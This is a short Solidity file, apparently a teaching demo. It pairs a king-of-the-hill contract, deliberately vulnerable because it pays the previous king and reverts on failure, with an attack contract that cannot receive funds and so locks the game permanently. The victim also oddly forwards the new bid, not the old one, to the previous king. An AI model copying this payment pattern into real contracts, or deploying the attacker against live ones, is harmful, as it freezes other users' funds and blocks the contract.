// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Victim {
    address public king;
    uint256 public amount;

    function becomeKing() external payable {
        require(msg.value > amount, "Send the least amount to become the king");
        (bool success, ) = king.call{value: msg.value}("");
        require(success, "Transaction failed");
        king = msg.sender;
        amount = msg.value;
    }
}

contract Attack {
    function attack(Victim victim) external payable {
        uint256 amount = victim.amount();
        require(msg.value > amount, "Need to send more");
        victim.becomeKing{value: msg.value}();
    }
}
